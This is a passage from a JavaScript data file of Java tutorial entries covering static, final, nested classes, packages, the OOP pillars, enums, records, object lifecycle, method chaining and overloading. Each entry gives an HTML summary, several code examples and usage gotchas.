    "others depend on it is hard &mdash; so start restrictive.</p>"
};

C["static-keyword"] = {
  summary: "<p>The <strong><code>static</code></strong> keyword makes a member belong to the <em>class " +
    "itself</em> rather than to instances. Static fields are shared across all instances; static methods can " +
    "be called without an object (<code>ClassName.method()</code>) but can't access instance state. Static " +
    "blocks run once when the class loads. Used for utilities, constants, factory methods, and shared " +
    "state.</p>",
  examples: [
    {
      title: "Example 1: Static fields and methods",
      description: "<p>Class-level, shared, callable without an instance.</p>",
      code: "class MathUtil {\n  static final double PI = 3.14159;   // shared constant\n  static int square(int n) { return n * n; } // no instance needed\n}\nMathUtil.square(5);   // 25, called on the class\nMathUtil.PI;          // shared value"
    },
    {
      title: "Example 2: Shared mutable static (use with care)",
      description: "<p>A static counter shared by all instances.</p>",
      code: "class Widget {\n  static int count = 0;   // shared across ALL instances\n  Widget() { count++; }\n}\nnew Widget(); new Widget();\nSystem.out.println(Widget.count); // 2"
    },
    {
      title: "Example 3: static factory methods",
      description: "<p>A static method that returns an instance - often clearer than a constructor and able to return cached or subtype instances.</p>",
      code: "class Color {\n" +
        "  private Color(int rgb) {}\n" +
        "  static Color of(int rgb) { return new Color(rgb); }\n" +
        "  static Color black() { return of(0); }\n" +
        "}\n" +
        "Color c = Color.black(); // reads better than 'new Color(0)' and can cache"
    },
    {
      title: "Example 4 (edge case): static methods don't override - they hide",
      description: "<p>A static method in a subclass with the same signature hides (not overrides) the parent's; dispatch is by the compile-time type.</p>",
      code: "class A { static String who() { return \"A\"; } }\n" +
        "class B extends A { static String who() { return \"B\"; } }\n" +
        "\n" +
        "A ref = new B();\n" +
        "System.out.println(ref.who()); // \"A\" - resolved by the variable's type, not B\n" +
        "// Also: a static method cannot use 'this' or instance fields."
    }
  ],
  whenToUse: "<p>Use <code>static</code> for utility methods, constants (<code>static final</code>), and " +
    "factory methods. <strong>Gotchas:</strong> static methods can't access instance fields/methods or " +
    "<code>this</code>. <strong>Shared mutable static state is a classic source of thread-safety bugs</strong> " +
    "and makes testing harder (global state) &mdash; prefer instance state or proper synchronization. Overusing " +
    "static turns OOP into procedural code. Static is great for stateless helpers and constants; be cautious " +
    "with mutable static.</p>"
};

C["final-keyword"] = {
  summary: "<p>The <strong><code>final</code></strong> keyword marks something as unchangeable: a " +
    "<code>final</code> <strong>variable</strong> can be assigned once (a constant), a <code>final</code> " +
    "<strong>method</strong> can't be overridden, and a <code>final</code> <strong>class</strong> can't be " +
    "subclassed. It communicates and enforces immutability/finality, aiding correctness, readability, and " +
    "sometimes performance.</p>",
  examples: [
    {
      title: "Example 1: final variables and constants",
      description: "<p>Assign once; reassignment is a compile error.</p>",
      code: "final int MAX = 100;\n// MAX = 200;   // ERROR: cannot reassign\nstatic final double PI = 3.14159;  // class constant\n// Final reference: the variable can't be reassigned, but the\n// OBJECT it points to may still be mutable:\nfinal List<String> list = new ArrayList<>();\nlist.add(\"ok\");   // allowed (mutates the object, not the reference)"
    },
    {
      title: "Example 2: final method and class",
      description: "<p>Prevent overriding/subclassing.</p>",
      code: "final class Constants {}        // cannot be extended\nclass Base { final void core() {} }  // subclasses can't override core()"
    },
    {
      title: "Example 3: final class and final method",
      description: "<p><code>final</code> on a class blocks subclassing; on a method blocks overriding.</p>",
      code: "final class Money {}              // cannot be extended (like String)\n" +
        "// class Sub extends Money {}     // ERROR\n" +
        "\n" +
        "class Base { final void rules() {} }\n" +
        "class Sub2 extends Base {\n" +
        "  // void rules() {}              // ERROR: cannot override final method\n" +
        "}"
    },
    {
      title: "Example 4 (edge case): final means the reference is fixed, not the object",
      description: "<p>A common misconception - a <code>final</code> reference can't be reassigned, but the object it points to can still be mutated.</p>",
      code: "final List<Integer> xs = new ArrayList<>();\n" +
        "xs.add(1);          // OK - mutating the object is fine\n" +
        "xs = new ArrayList<>(); // ERROR - cannot reassign the final variable\n" +
        "// For true immutability use List.of(...) or an unmodifiable wrapper."
    }
  ],
  whenToUse: "<p>Use <code>final</code> liberally for variables that shouldn't change (clearer intent, safer " +
    "in concurrency), for constants, and to lock down classes/methods not meant for extension (e.g. " +
    "<code>String</code> is final). <strong>Gotchas:</strong> a <code>final</code> reference doesn't make the " +
    "<em>object</em> immutable &mdash; only the variable binding; for true immutability, make fields final " +
    "<em>and</em> avoid mutators (or use <code>record</code>). <code>final</code> on method parameters/locals " +
    "is mainly for clarity and is required for variables captured by lambdas/anonymous classes (effectively " +
    "final).</p>"
};

C["nested-classes"] = {
  summary: "<p>Java lets you define classes inside other classes. <strong>Static nested classes</strong> are " +
    "associated with the outer class but not an instance; <strong>inner (non-static) classes</strong> hold a " +
    "reference to an enclosing instance; <strong>local classes</strong> are defined inside a method; and " +
    "<strong>anonymous classes</strong> are one-off implementations defined inline. They group tightly-" +
    "related code and control scope.</p>",
  examples: [
    {
      title: "Example 1: Static nested vs inner class",
      description: "<p>Static nested needs no outer instance; inner does.</p>",
      code: "class Outer {\n  static class Nested { }     // independent of Outer instances\n  class Inner { }             // tied to an Outer instance\n}\nOuter.Nested n = new Outer.Nested();      // no Outer needed\nOuter.Inner i = new Outer().new Inner();  // needs an Outer"
    },
    {
      title: "Example 2: Anonymous class",
      description: "<p>Inline one-off implementation of an interface.</p>",
      code: "Runnable r = new Runnable() {\n  public void run() { System.out.println(\"running\"); }\n};\n// Modern equivalent with a lambda:\nRunnable r2 = () -> System.out.println(\"running\");"
    },
    {
      title: "Example 3: anonymous class vs lambda",
      description: "<p>An anonymous class implements an interface inline; for a single-method interface a lambda is shorter.</p>",
      code: "Runnable r1 = new Runnable() {        // anonymous class\n" +
        "  public void run() { System.out.println(\"hi\"); }\n" +
        "};\n" +
        "Runnable r2 = () -> System.out.println(\"hi\"); // lambda - same effect\n" +
        "// Use an anonymous class when you need state or multiple methods."
    },
    {
      title: "Example 4 (edge case): a non-static inner class holds the outer reference",
      description: "<p>An inner (non-static) class keeps an implicit reference to its enclosing instance - a subtle memory-leak source.</p>",
      code: "class Outer {\n" +
        "  class Inner {}             // implicitly references Outer.this\n" +
        "  static class Nested {}     // independent - no outer reference\n" +
        "}\n" +
        "// new Outer().new Inner();  // odd syntax: needs an Outer instance\n" +
        "// If an Inner outlives its Outer (e.g. stored in a cache), Outer can't be GC'd.\n" +
        "// Prefer 'static' nested classes unless you truly need the outer instance."
    }
  ],
  whenToUse: "<p>Use <strong>static nested</strong> classes for helpers that logically belong to the outer " +
    "class (e.g. a builder, a node type); <strong>inner</strong> classes when you need access to the outer " +
    "instance's state; <strong>anonymous</strong> classes for short one-off implementations (though lambdas " +
    "now replace many of these). <strong>Gotchas:</strong> non-static inner classes hold an implicit " +
    "reference to the outer instance, which can cause memory leaks (e.g. in long-lived listeners) &mdash; " +
    "prefer <code>static</code> nested unless you truly need the enclosing instance. Anonymous classes can " +
    "only capture effectively-final variables.</p>"
};

C["packages"] = {
  summary: "<p>A <strong>package</strong> is a namespace that groups related classes, preventing naming " +
    "conflicts and organizing code (e.g. <code>com.company.project.module</code>). The <code>package</code> " +
    "statement declares a class's package; <code>import</code> brings in classes from others. Packages also " +
    "interact with access control (package-private visibility) and map to directory structure.</p>",
  examples: [
    {
      title: "Example 1: Declaring and importing",
      description: "<p>Package declaration + imports.</p>",
      code: "package com.example.orders;     // this class's namespace\n\nimport java.util.List;          // import a specific class\nimport com.example.users.User;  // import from another package\n\npublic class OrderService { /* ... */ }"
    },
    {
      title: "Example 2: Fully-qualified names + structure",
      description: "<p>Packages map to folders.</p>",
      code: "// File path mirrors the package:\n//   src/com/example/orders/OrderService.java\n// Use fully-qualified name to avoid a clash:\njava.util.Date d1;\njava.sql.Date d2;   // two different Date classes"
    },
    {
      title: "Example 3: imports, including static import",
      description: "<p>Import brings a type into scope by simple name; a static import brings in static members.</p>",
      code: "import java.util.List;            // single type\n" +
        "import java.util.*;               // whole package (avoid in large code)\n" +
        "import static java.lang.Math.*;   // static members\n" +
        "\n" +
        "double h = sqrt(pow(3, 2) + pow(4, 2)); // no 'Math.' prefix needed"
    },
    {
      title: "Example 4 (edge case): package must match the directory, and name clashes need FQN",
      description: "<p>The <code>package</code> statement must mirror the folder path; two same-named classes require a fully-qualified name.</p>",
      code: "// File at src/com/acme/Order.java MUST start with:\n" +
        "package com.acme;\n" +
        "\n" +
        "// java.util.Date vs java.sql.Date both imported? Import one, FQ the other:\n" +
        "import java.util.Date;\n" +
        "java.sql.Date sqlDate = new java.sql.Date(0L); // fully-qualified to disambiguate"
    }
  ],
  whenToUse: "<p>Organize every non-trivial project into packages by feature or layer. <strong>Conventions:</strong> " +
    "reverse-domain naming (<code>com.company...</code>), all lowercase. <strong>Gotchas:</strong> the package " +
    "must match the directory structure or compilation fails. Avoid wildcard imports (<code>import " +
    "java.util.*</code>) in large codebases &mdash; explicit imports document dependencies. Two classes with " +
    "the same simple name require a fully-qualified name. Package structure should reflect architecture; the " +
    "module system (Java 9+) adds stronger encapsulation on top of packages.</p>"
};

/* ===================== MORE ABOUT OOP ===================== */

C["abstraction"] = {
  summary: "<p><strong>Abstraction</strong> means exposing <em>what</em> something does while hiding " +
    "<em>how</em>. In Java you achieve it with <strong>interfaces</strong> (pure contracts) and " +
    "<strong>abstract classes</strong> (partial implementations). Callers depend on the abstract type and " +
    "remain unaffected by changes to concrete implementations &mdash; reducing complexity and coupling.</p>",
  examples: [
    {
      title: "Example 1: Abstraction via an interface",
      description: "<p>Callers use the contract, not the implementation.</p>",
      code: "interface PaymentGateway { void charge(double amount); }\nclass StripeGateway implements PaymentGateway {\n  public void charge(double amount) { /* Stripe details hidden */ }\n}\nvoid checkout(PaymentGateway gw) { gw.charge(99.0); } // doesn't care which one"
    },
    {
      title: "Example 2: Abstract class with a template method",
      description: "<p>Define the skeleton; subclasses fill the gaps.</p>",
      code: "abstract class Report {\n  public final String generate() { return header() + body(); }\n  protected String header() { return \"REPORT\\n\"; }\n  protected abstract String body();   // subclasses implement\n}"
    },
    {
      title: "Example 3: programming to an abstraction enables swapping implementations",
      description: "<p>Depending on an interface (the abstraction) lets you change the concrete class without touching callers.</p>",
      code: "interface PaymentGateway { void charge(int cents); }\n" +
        "class StripeGateway implements PaymentGateway { public void charge(int c) {} }\n" +
        "class FakeGateway implements PaymentGateway { public void charge(int c) {} }\n" +
        "\n" +
        "// Caller depends on the abstraction, not Stripe specifically:\n" +
        "void checkout(PaymentGateway gw) { gw.charge(999); }\n" +
        "// Swap StripeGateway for FakeGateway in tests with zero caller changes."
    },
    {
      title: "Example 4 (edge case): leaky abstraction",
      description: "<p>An abstraction that exposes implementation details (or throws implementation-specific errors) forces callers to know the internals - defeating the purpose.</p>",
      code: "interface UserRepo {\n" +
        "  User find(long id) throws java.sql.SQLException; // LEAK: SQL detail in the API\n" +
        "}\n" +
        "// Now every caller must handle SQLException even for an in-memory impl.\n" +
        "// Better: throw a domain RepositoryException so the storage tech stays hidden."
    }
  ],
  whenToUse: "<p>Abstract at boundaries where implementations vary or you want to insulate callers (data " +
    "access, external services, plug-in points). <strong>Interface vs abstract class:</strong> interface for " +
    "a capability multiple unrelated types can have; abstract class when subclasses share code/state. " +
    "<strong>Gotchas:</strong> don't over-abstract &mdash; an interface with one implementation that will " +
    "never have another is needless indirection. Abstract in response to real variation or testing needs, not " +
    "speculation.</p>"
};

C["encapsulation"] = {
  summary: "<p><strong>Encapsulation</strong> bundles data with the methods that operate on it and hides " +
    "internal state behind a controlled interface (private fields, public methods). It protects invariants " +
    "(rules that must always hold) and lets you change internals without breaking callers. It's the most " +
    "practically valuable OOP pillar.</p>",
  examples: [
    {
      title: "Example 1: Guarding an invariant",
      description: "<p>The only way to change balance enforces the rule.</p>",
      code: "class Account {\n  private double balance;\n  public void withdraw(double amt) {\n    if (amt > balance) throw new IllegalStateException(\"insufficient\");\n    balance -= amt;        // invariant protected: never goes negative\n  }\n  public double getBalance() { return balance; }\n}"
    },
    {
      title: "Example 2: Hiding implementation",
      description: "<p>Internals can change without affecting callers.</p>",
      code: "class Temperature {\n  private double celsius;\n  public double fahrenheit() { return celsius * 9/5 + 32; }\n  // Could store fahrenheit instead later - callers of fahrenheit() unaffected.\n}"
    },
    {
      title: "Example 3: enforcing an invariant through a setter",
      description: "<p>Encapsulation lets an object reject invalid state instead of trusting callers.</p>",
      code: "class Account {\n" +
        "  private int balanceCents = 0;\n" +
        "  void withdraw(int cents) {\n" +
        "    if (cents <= 0) throw new IllegalArgumentException(\"positive only\");\n" +
        "    if (cents > balanceCents) throw new IllegalStateException(\"insufficient\");\n" +
        "    balanceCents -= cents;        // invariant: balance never goes negative\n" +
        "  }\n" +
        "}"
    },
    {
      title: "Example 4 (edge case): a getter can silently break encapsulation",
      description: "<p>Exposing a mutable internal object via a getter lets outsiders bypass your invariants entirely.</p>",
      code: "class Order {\n" +
        "  private final List<Item> items = new ArrayList<>();\n" +
        "  List<Item> getItems() { return items; }   // anyone can add/remove!\n" +
        "  List<Item> getItemsSafe() { return Collections.unmodifiableList(items); }\n" +
        "}\n" +
        "order.getItems().clear(); // bypasses any 'addItem' validation you wrote"
    }
  ],
  whenToUse: "<p>Encapsulate whenever an object has rules about its state &mdash; nearly always. " +
    "<strong>Gotchas:</strong> auto-generating a getter and setter for every field isn't real encapsulation " +
    "(it just makes fields public with extra steps). Expose <em>operations</em> (<code>deposit</code>, " +
    "<code>cancel</code>), not raw data access. Beware returning references to mutable internal objects " +
    "(callers can mutate them) &mdash; return copies or immutable views. Encapsulation localizes change, which " +
    "is its biggest payoff.</p>"
};

C["inheritance"] = {
  summary: "<p><strong>Inheritance</strong> lets a subclass acquire the fields/methods of a superclass via " +
    "<code>extends</code>, modeling an 'is-a' relationship and enabling code reuse and polymorphism. The " +
    "subclass can add members and override inherited methods. Java supports single class inheritance (one " +
    "superclass) but multiple interface implementation.</p>",
  examples: [
    {
      title: "Example 1: extends and super",
      description: "<p>Reuse and extend a base class.</p>",
      code: "class Animal {\n  String name;\n  Animal(String name) { this.name = name; }\n  String speak() { return \"...\"; }\n}\nclass Dog extends Animal {\n  Dog(String name) { super(name); }   // call parent constructor\n  @Override String speak() { return \"Woof\"; }\n}"
    },
    {
      title: "Example 2: Polymorphic use",
      description: "<p>Treat subclasses through the base type.</p>",
      code: "Animal a = new Dog(\"Rex\");\na.speak();   // \"Woof\" - the override runs (dynamic dispatch)"
    },
    {
      title: "Example 3: super() and constructor chaining",
      description: "<p>A subclass constructor must initialize its parent first via <code>super(...)</code> (implicit if omitted).</p>",
      code: "class Animal {\n" +
        "  final String name;\n" +
        "  Animal(String name) { this.name = name; }\n" +
        "}\n" +
        "class Dog extends Animal {\n" +
        "  Dog(String name) { super(name); }  // must call - Animal has no no-arg ctor\n" +
        "  String speak() { return name + \" says woof\"; }\n" +
        "}"
    },
    {
      title: "Example 4 (edge case): prefer composition - the fragile base class",
      description: "<p>Deep inheritance couples subclasses to the parent's internals; a base-class change can silently break them.</p>",
      code: "// Classic trap: extending ArrayList to 'count adds'\n" +
        "class CountingList<E> extends ArrayList<E> {\n" +
        "  int added = 0;\n" +
        "  public boolean add(E e) { added++; return super.add(e); }\n" +
        "  public boolean addAll(Collection<? extends E> c) {\n" +
        "    added += c.size(); return super.addAll(c); // BUG: addAll calls add too -> double count\n" +
        "  }\n" +
        "}\n" +
        "// Composition (wrap a List in a field) avoids depending on internal call patterns."
    }
  ],
  whenToUse: "<p>Use inheritance for genuine, stable 'is-a' relationships where the subclass is substitutable " +
    "for the parent (Liskov). <strong>Gotchas:</strong> inheritance is the most <em>misused</em> OOP feature &mdash; " +
    "it creates tight coupling and fragile hierarchies. <strong>Prefer composition over inheritance</strong> " +
    "when you just want to reuse code (has-a rather than is-a). Java allows only single class inheritance. " +
    "Always use <code>@Override</code> so the compiler catches mistakes. Deep hierarchies are a smell; favor " +
    "shallow ones and interfaces.</p>"
};

C["interfaces"] = {
  summary: "<p>An <strong>interface</strong> is a contract: a set of method signatures (and constants) a class " +
    "promises to implement via <code>implements</code>. A class can implement many interfaces (multiple " +
    "inheritance of type). Modern Java interfaces can also have <code>default</code> and <code>static</code> " +
    "methods. Interfaces enable polymorphism and loose coupling &mdash; code depends on capabilities, not " +
    "concrete types.</p>",
  examples: [
    {
      title: "Example 1: Contract + implementation",
      description: "<p>Multiple classes fulfill the same contract.</p>",
      code: "interface Shape { double area(); }\nclass Circle implements Shape {\n  double r;\n  Circle(double r) { this.r = r; }\n  public double area() { return Math.PI * r * r; }\n}\nShape s = new Circle(2);   // depend on the contract"
    },
    {
      title: "Example 2: Default methods + multiple interfaces",
      description: "<p>Interfaces can provide default behavior; a class implements many.</p>",
      code: "interface Loggable { default void log(String m) { System.out.println(m); } }\ninterface Serializable2 { String serialize(); }\nclass Order implements Loggable, Serializable2 {\n  public String serialize() { return \"{}\"; }\n}"
    },
    {
      title: "Example 3: default and static methods in interfaces",
      description: "<p>Since Java 8, interfaces can carry <code>default</code> implementations (added without breaking implementers) and <code>static</code> helpers.</p>",
      code: "interface Greeter {\n" +
        "  String name();\n" +
        "  default String greet() { return \"Hi, \" + name(); } // default impl\n" +
        "  static Greeter of(String n) { return () -> n; }      // static factory\n" +
        "}\n" +
        "Greeter.of(\"Sam\").greet(); // \"Hi, Sam\""
    },
    {
      title: "Example 4 (edge case): the diamond problem with default methods",
      description: "<p>If two interfaces provide the same default method, the implementing class must override to resolve the conflict.</p>",
      code: "interface A { default String id() { return \"A\"; } }\n" +
        "interface B { default String id() { return \"B\"; } }\n" +
        "class C implements A, B {\n" +
        "  // ERROR unless you override:\n" +
        "  public String id() { return A.super.id(); } // explicitly pick A's version\n" +
        "}"
    }
  ],
  whenToUse: "<p>Use interfaces to define capabilities, decouple callers from implementations, enable testing " +
    "(swap fakes), and support the Dependency Inversion Principle. <strong>Gotchas:</strong> don't create an " +
    "interface for every class reflexively &mdash; one with a single permanent implementation is just " +
    "indirection. Keep interfaces small and focused (Interface Segregation). <code>default</code> methods help " +
    "evolve interfaces without breaking implementers but can create diamond ambiguity (resolve explicitly). " +
    "Prefer interfaces over abstract classes when you only need a contract.</p>"
};

C["enums"] = {
  summary: "<p>An <strong>enum</strong> defines a fixed set of named constants as a type. Java enums are " +
    "full-featured: they can have fields, constructors, and methods, implement interfaces, and each constant " +
    "can override behavior. They provide type safety (only valid values), are great for switch statements, and " +
    "are inherently singletons.</p>",
  examples: [
    {
      title: "Example 1: Simple and rich enums",
      description: "<p>Constants, with optional data and methods.</p>",
      code: "enum Day { MON, TUE, WED }\n\nenum Planet {\n  EARTH(9.8), MARS(3.7);\n  private final double gravity;\n  Planet(double g) { this.gravity = g; }\n  double gravity() { return gravity; }\n}\nPlanet.MARS.gravity();   // 3.7"
    },
    {
      title: "Example 2: Enum in switch + iteration",
      description: "<p>Type-safe branching and listing values.</p>",
      code: "Day d = Day.MON;\nint hours = switch (d) {\n  case MON, TUE, WED -> 8;\n};\nfor (Day day : Day.values()) System.out.println(day);"
    },
    {
      title: "Example 3: enums with fields, constructors, and methods",
      description: "<p>Each enum constant can carry data and behavior - far richer than plain int constants.</p>",
      code: "enum Planet {\n" +
        "  EARTH(5.97e24, 6.37e6), MARS(6.42e23, 3.39e6);\n" +
        "  private final double mass, radius;\n" +
        "  Planet(double m, double r) { mass = m; radius = r; }\n" +
        "  double gravity() { return 6.67e-11 * mass / (radius * radius); }\n" +
        "}\n" +
        "Planet.EARTH.gravity(); // ~9.8"
    },
    {
      title: "Example 4 (edge case): enums in switch and the EnumSet/EnumMap pair",
      description: "<p>Switching on an enum needs the unqualified constant name; <code>EnumSet</code>/<code>EnumMap</code> are the efficient collections for enums.</p>",
      code: "enum Day { MON, TUE, SAT, SUN }\n" +
        "String kind = switch (d) {\n" +
        "  case SAT, SUN -> \"weekend\";   // NOT Day.SAT - just SAT\n" +
        "  default -> \"weekday\";\n" +
        "};\n" +
        "EnumSet<Day> weekend = EnumSet.of(Day.SAT, Day.SUN); // compact bitset-backed set"
    }
  ],
  whenToUse: "<p>Use enums for any fixed set of related constants &mdash; statuses, types, days, modes &mdash; " +
    "instead of magic strings or int constants (type-safe, autocomplete, switch-friendly). Rich enums can " +
    "even replace small strategy hierarchies. <strong>Gotchas:</strong> enums are singletons and serializable-" +
    "safe, which makes them a clean way to implement the Singleton pattern. Adding/removing constants is a " +
    "(source and sometimes binary) API change. For very large or dynamic value sets, enums don't fit &mdash; " +
    "use a lookup/database instead.</p>"
};

C["record"] = {
  summary: "<p>A <strong>record</strong> (Java 16+) is a concise way to declare an immutable data-carrier " +
    "class. From a single declaration, Java generates the constructor, private final fields, accessors, " +
    "<code>equals()</code>, <code>hashCode()</code>, and <code>toString()</code>. Records eliminate the " +
    "boilerplate of plain data classes and signal 'this is just data'.</p>",
  examples: [
    {
      title: "Example 1: A record vs a boilerplate class",
      description: "<p>One line replaces dozens.</p>",
      code: "record Point(int x, int y) {}   // generates ctor, x(), y(), equals, hashCode, toString\nPoint p = new Point(3, 4);\np.x();                          // 3 (accessor)\np.equals(new Point(3, 4));      // true (value-based)\nSystem.out.println(p);          // Point[x=3, y=4]"
    },
    {
      title: "Example 2: Validation in the compact constructor",
      description: "<p>Add invariants without writing the full constructor.</p>",
      code: "record Range(int lo, int hi) {\n  Range {   // compact constructor\n    if (lo > hi) throw new IllegalArgumentException(\"lo > hi\");\n  }\n}"
    },
    {
      title: "Example 3: compact canonical constructor for validation",
      description: "<p>A record can validate or normalize its components in a compact constructor.</p>",
      code: "record Range(int low, int high) {\n" +
        "  Range {                              // compact canonical constructor\n" +
        "    if (low > high) throw new IllegalArgumentException(\"low > high\");\n" +
        "  }\n" +
        "}\n" +
        "new Range(1, 5);   // ok\n" +
        "new Range(5, 1);   // throws - invariant enforced at construction"
    },
    {
      title: "Example 4 (edge case): records are shallowly immutable",
      description: "<p>The record reference fields are final, but a mutable component (like a List) can still be changed - copy defensively if it matters.</p>",
      code: "record Team(String name, List<String> members) {}\n" +
        "var t = new Team(\"A\", new ArrayList<>(List.of(\"Sam\")));\n" +
        "t.members().add(\"Jo\"); // mutates the inner list - record can't prevent this\n" +
        "\n" +
        "record SafeTeam(String name, List<String> members) {\n" +
        "  SafeTeam { members = List.copyOf(members); } // defensive immutable copy\n" +
        "}"
    }
  ],
  whenToUse: "<p>Use records for immutable data carriers &mdash; DTOs, value objects, API responses, map keys, " +
    "tuples-like returns. They pair well with pattern matching and sealed types. <strong>Gotchas:</strong> " +
    "records are <em>immutable</em> (all fields final) &mdash; not for mutable entities. They can't extend " +
    "classes (but can implement interfaces). Components should be immutable too (a record holding a mutable " +
    "list isn't deeply immutable). Don't force records where behavior-rich objects are needed; they're " +
    "specifically for data.</p>"
};

C["object-lifecycle"] = {
  summary: "<p>An object's <strong>lifecycle</strong>: it's <em>created</em> with <code>new</code> (memory " +
    "allocated, constructor runs), <em>used</em> while references to it exist, and becomes eligible for " +
    "<strong>garbage collection</strong> when no references remain. Java's garbage collector automatically " +
    "reclaims unreachable objects &mdash; there's no manual <code>free()</code>/<code>delete</code>.</p>",
  examples: [
    {
      title: "Example 1: Creation to eligibility for GC",
      description: "<p>An object becomes collectable when unreferenced.</p>",
      code: "String s = new String(\"hi\");  // created, referenced\ns = null;                      // no more references -> eligible for GC\n// or: reassigning s to a new object also drops the old one's reference"
    },
    {
      title: "Example 2: Cleanup with try-with-resources",
      description: "<p>Deterministic release of external resources (not memory).</p>",
      code: "// For resources (files, connections), use AutoCloseable:\ntry (var reader = new BufferedReader(new FileReader(\"f.txt\"))) {\n  reader.readLine();\n}  // close() called automatically, even on exception"
    },
    {
      title: "Example 3: try-with-resources for deterministic cleanup",
      description: "<p>Since finalizers are unreliable, use <code>AutoCloseable</code> + try-with-resources to release resources promptly.</p>",
      code: "try (var in = Files.newInputStream(path)) {\n" +
        "  in.read();\n" +
        "} // in.close() called automatically, even on exception\n" +
        "// This - not finalize()/GC - is how you manage files, sockets, connections."
    },
    {
      title: "Example 4 (edge case): a lingering reference prevents garbage collection",
      description: "<p>Objects live as long as something reachable references them; forgotten references in long-lived collections are the classic Java 'memory leak'.</p>",
      code: "static final Map<String, byte[]> cache = new HashMap<>();\n" +
        "void handle(String id) { cache.put(id, load(id)); } // never evicted -> grows forever\n" +
        "\n" +
        "// Fixes: bound the cache (e.g. LinkedHashMap LRU), or use WeakHashMap so\n" +
        "// entries become collectable when keys are no longer referenced elsewhere."
    }
  ],
  whenToUse: "<p>Understanding the lifecycle helps you avoid memory leaks and manage resources. " +
    "<strong>Gotchas:</strong> GC handles <em>memory</em>, but not other resources &mdash; always close files, " +
    "sockets, and DB connections (use <strong>try-with-resources</strong>). 'Memory leaks' in Java come from " +
    "unintended references that keep objects alive (static collections, listeners, caches). Don't rely on " +
    "<code>finalize()</code> (deprecated, unpredictable) &mdash; use <code>AutoCloseable</code>. You don't " +
    "control <em>when</em> GC runs; <code>System.gc()</code> is only a hint.</p>"
};

C["method-chaining"] = {
  summary: "<p><strong>Method chaining</strong> is calling multiple methods in sequence on the same object by " +
    "having each method return <code>this</code> (or another chainable object). It produces fluent, readable " +
    "code and underlies the Builder pattern and fluent APIs (Streams, StringBuilder, query builders).</p>",
  examples: [
    {
      title: "Example 1: A fluent builder",
      description: "<p>Each setter returns <code>this</code> to enable chaining.</p>",
      code: "class PizzaBuilder {\n  PizzaBuilder size(String s) { /* ... */ return this; }\n  PizzaBuilder topping(String t) { /* ... */ return this; }\n  Pizza build() { return new Pizza(); }\n}\nnew PizzaBuilder().size(\"L\").topping(\"cheese\").topping(\"ham\").build();"
    },
    {
      title: "Example 2: Built-in fluent APIs",
      description: "<p>Streams and StringBuilder chain naturally.</p>",
      code: "String r = new StringBuilder().append(\"a\").append(\"b\").reverse().toString();\nList<Integer> evens = nums.stream().filter(n -> n % 2 == 0).sorted().toList();"
    },
    {
      title: "Example 3: the builder pattern",
      description: "<p>Returning <code>this</code> from each setter creates a readable, order-independent way to construct objects with many optional fields.</p>",
      code: "class Pizza {\n" +
        "  static class Builder {\n" +
        "    private boolean cheese, bacon;\n" +
        "    Builder cheese() { this.cheese = true; return this; }\n" +
        "    Builder bacon()  { this.bacon = true;  return this; }\n" +
        "    Pizza build() { return new Pizza(/* ... */); }\n" +
        "  }\n" +
        "}\n" +
        "new Pizza.Builder().cheese().bacon().build();"
    },
    {
      title: "Example 4 (edge case): NPE risk in a chain",
      description: "<p>Any link returning <code>null</code> breaks the whole chain with an NPE that's hard to localize - chain only over non-null returns or use Optional.</p>",
      code: "// If getAddress() can be null, this NPEs with no clue which call failed:\n" +
        "String city = user.getAddress().getCity().toUpperCase();\n" +
        "\n" +
        "// Safer with Optional:\n" +
        "String city2 = Optional.ofNullable(user.getAddress())\n" +
        "    .map(Address::getCity).map(String::toUpperCase).orElse(\"unknown\");"
    }
  ],
  whenToUse: "<p>Use chaining for builders, configuration objects, and data pipelines where it improves " +
    "readability. <strong>Gotchas:</strong> chains can be hard to debug (a failure mid-chain has a less " +
    "precise stack trace) and over-long chains hurt readability &mdash; break them up. For chaining to work, " +
    "methods must return a usable object (typically <code>this</code> for builders). Don't force chaining " +
    "where simple sequential statements are clearer. It complements, not replaces, good method design.</p>"
};

C["method-overloading-overriding"] = {
  summary: "<p><strong>Overloading</strong> = multiple methods with the <em>same name but different " +
    "parameters</em> in the same class (resolved at compile time by argument types). <strong>Overriding</strong> " +
    "= a subclass redefining an inherited method with the <em>same signature</em> (resolved at runtime by the " +
    "object's actual type &mdash; dynamic dispatch). Overloading is about variety; overriding is about " +
    "polymorphism.</p>",
  examples: [
    {
      title: "Example 1: Overloading (same name, different params)",
      description: "<p>Compiler picks the method by arguments.</p>",
      code: "class Printer {\n  void print(int n) { }\n  void print(String s) { }       // overload\n  void print(int a, int b) { }   // overload\n}"
    },
    {
      title: "Example 2: Overriding (same signature, subclass)",
      description: "<p>Runtime picks the method by actual type.</p>",
      code: "class Animal { String speak() { return \"...\"; } }\nclass Cat extends Animal {\n  @Override String speak() { return \"Meow\"; }  // override\n}\nAnimal a = new Cat();\na.speak();   // \"Meow\" (dynamic dispatch)"
    },
    {
      title: "Example 3: @Override catches a broken override",
      description: "<p>Annotating an override makes a signature mismatch a compile error instead of an accidental overload.</p>",
      code: "class Base { boolean equals(Object o) { return true; } }\n" +
        "class Sub extends Base {\n" +
        "  @Override boolean equals(Sub s) { return true; } // ERROR: doesn't override\n" +
        "  // (param is Sub, not Object -> it's an OVERLOAD; @Override flags the mistake)\n" +
        "}"
    },
    {
      title: "Example 4 (edge case): overload resolution is by COMPILE-TIME type",
      description: "<p>Overloading is chosen statically; overriding is dispatched dynamically. Mixing them surprises people.</p>",
      code: "void print(Object o) { System.out.println(\"Object\"); }\n" +
        "void print(String s) { System.out.println(\"String\"); }\n" +
        "\n" +
        "Object x = \"hello\";\n" +
        "print(x); // prints \"Object\" - chosen by x's declared type, not its runtime type\n" +
        "// Overriding would use the runtime type; overloading does not."
    }
  ],
  whenToUse: "<p>Overload when an operation logically applies to different argument types/counts (e.g. " +
    "<code>println</code>). Override to specialize inherited behavior polymorphically. <strong>Gotchas:</strong> " +
    "always annotate overrides with <code>@Override</code> &mdash; without it, a typo or signature mismatch " +
    "silently creates an unrelated <em>overload</em> instead, a subtle bug. Overload resolution can be " +
    "confusing with autoboxing/varargs/null. Don't overload with confusingly-similar parameters. Overriding " +
    "must keep the contract (Liskov) and not weaken access or broaden checked exceptions.</p>"
};

C["static-vs-dynamic-binding"] = {
  summary: "<p><strong>Binding</strong> is how a method call is connected to its implementation. " +
    "<strong>Static (early) binding</strong> is resolved at compile time &mdash; for <code>static</code>, " +
    "<code>private</code>, <code>final</code> methods and overloaded methods (by declared types). " +
    "<strong>Dynamic (late) binding</strong> is resolved at runtime based on the object's actual type &mdash; " +
    "for overridden instance methods (polymorphism). Dynamic binding is what makes overriding work.</p>",
  examples: [
    {
